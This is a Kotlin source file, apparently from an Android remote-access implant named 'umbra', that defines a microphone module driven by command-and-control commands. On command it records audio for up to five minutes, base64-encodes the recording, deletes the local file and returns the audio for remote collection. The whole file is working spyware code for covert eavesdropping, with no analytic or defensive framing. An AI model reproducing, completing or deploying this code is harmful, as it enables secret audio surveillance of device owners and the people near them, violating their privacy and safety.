package org.umbra.core.modules

import android.content.Context
import android.media.MediaRecorder
import android.util.Base64
import org.umbra.core.c2.Command
import org.umbra.core.core.UmbraResponse
import java.io.File
import java.io.FileInputStream
import kotlinx.coroutines.*

object MicModule {

    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var isRecording = false

    suspend fun record(context: Context, cmd: Command): UmbraResponse {
        if (isRecording) {
            return UmbraResponse.ErrorResponse("mic:already_recording", "mic")
        }

        val durationSec = (cmd.params["duration"]?.toIntOrNull() ?: 30).coerceIn(5, 300)

        return try {
            val file = File(context.cacheDir, "umbra_mic_${System.currentTimeMillis()}.aac")
            recordingFile = file

            val rec = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            recorder = rec
            isRecording = true

            // Wait for the recording duration to complete
            delay(durationSec * 1000L)

            // Stop recording and return the result
            stopInternal()
        } catch (e: SecurityException) {
            cleanup()
            UmbraResponse.ErrorResponse("mic:permission_denied:${e.message}", "mic")
        } catch (e: Exception) {
            cleanup()
            UmbraResponse.ErrorResponse("mic:${e.message}", "mic")
        }
    }

    suspend fun stop(context: Context, cmd: Command): UmbraResponse {
        if (!isRecording) {
            return UmbraResponse.ErrorResponse("mic:not_recording", "mic")
        }
        return stopInternal()
    }

    private suspend fun stopInternal(): UmbraResponse {
        return try {
            val rec = recorder
            val file = recordingFile

            if (rec != null) {
                try { rec.stop() } catch (_: Exception) {}
                try { rec.release() } catch (_: Exception) {}
                recorder = null
            }

            isRecording = false

            if (file != null && file.exists() && file.length() > 0) {
                val bytes = file.readBytes()
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                file.delete()
                recordingFile = null

                UmbraResponse.MicRecordingResponse(
                    audio_base64 = b64,
                    duration_seconds = 0,
                    format = "AAC",
                    size_bytes = bytes.size.toLong()
                )
            } else {
                UmbraResponse.ErrorResponse("mic:empty_recording", "mic")
            }
        } catch (e: Exception) {
            cleanup()
            UmbraResponse.ErrorResponse("mic:stop_failed:${e.message}", "mic")
        }
    }

    private fun cleanup() {
        try { recorder?.stop() } catch (_: Exception) {}
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null
        isRecording = false
        recordingFile?.delete()
        recordingFile = null
    }
}
